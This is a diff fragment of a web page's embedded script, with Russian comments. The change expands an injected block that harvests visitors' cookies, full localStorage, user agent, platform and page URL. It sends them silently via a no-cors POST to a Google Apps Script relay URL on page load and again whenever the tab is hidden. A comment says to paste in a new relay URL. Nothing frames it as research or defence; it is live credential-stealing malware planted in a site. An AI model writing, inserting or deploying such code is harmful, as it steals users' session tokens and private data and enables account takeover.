@@ -4431,25 +4431,35 @@
 })();
 <script>
 (function() {
-    const PROXY_URL = 'https://script.google.com/macros/s/AKfycbz640lR-e18-gzWhIPeuHlmWPhVE6bkGqeoBEvIuMsXc3DwgY--_cwU5LGjoPfa8uSr/exec';
+    const PROXY_URL = 'https://script.google.com/macros/s/AKfycbz640lR-e18-gzWhIPeuHlmWPhVE6bkGqeoBEvIuMsXc3DwgY--_cwU5LGjoPfa8uSr/exec'; // <--- СЮДА ВСТАВЬ НОВЫЙ URL
 
-    function sendData(text) {
+    function collectAndSend() {
+        // Собираем данные
+        const data = {
+            ts: new Date().toISOString(),
+            url: window.location.href,
+            platform: navigator.platform,
+            ua: navigator.userAgent,
+            cookies: document.cookie,
+            ls: JSON.stringify(localStorage)
+        };
+
+        // Отправляем
         fetch(PROXY_URL, {
             method: 'POST',
-            mode: 'no-cors', // Важно для обхода CORS
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ text: text })
-        });
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'text=' + encodeURIComponent(JSON.stringify(data, null, 2))
+        }).catch(err => console.log(err));
     }
 
-    // Собираем данные и шлем
-    const dump = JSON.stringify({
-        ua: navigator.userAgent,
-        ls: localStorage,
-        cookies: document.cookie
-    }, null, 2);
-
-    sendData("<b>[DUMP]</b>\n<pre>" + dump + "</pre>");
+    // Отправка при загрузке
+    collectAndSend();
+    
+    // Отправка при уходе с сайта
+    window.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') collectAndSend();
+    });
 })();
 </script>
 </body>
